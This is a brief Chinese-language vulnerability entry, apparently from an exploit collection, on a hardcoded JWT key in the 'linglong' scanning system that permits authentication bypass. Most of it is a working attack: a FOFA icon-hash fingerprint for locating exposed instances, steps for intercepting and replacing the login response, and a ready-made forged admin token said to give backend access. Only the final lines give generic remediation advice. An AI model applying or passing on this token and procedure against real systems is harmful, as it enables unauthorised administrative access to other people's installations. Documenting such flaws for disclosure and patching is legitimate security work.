# linglong扫描系统JWT密钥硬编码登录绕过漏洞

- **系统**：linglong　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`icon_hash="684115083"`

**请求体 / payload**
```
1、fofa
icon_hash="684115083"
2、部分界面如下
3、登录抓包
替换返回包
{"code":200,"data":{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxIiwiZXhwIjoxOTk5OTk5OTk5LCJpc3MiOiJsaW5nbG9uZyJ9.xAJf-cktK9WD5vXpfwTaIs6fSqVGZfG5BGnqDZwruMY"},"msg":"请求失败"}
4、成功进入后台
```

**其他**
- 修复建议: 1、请联系厂商进行修复。
 2、如非必要，禁止公网访问该系统。
 3、设置白名单访问。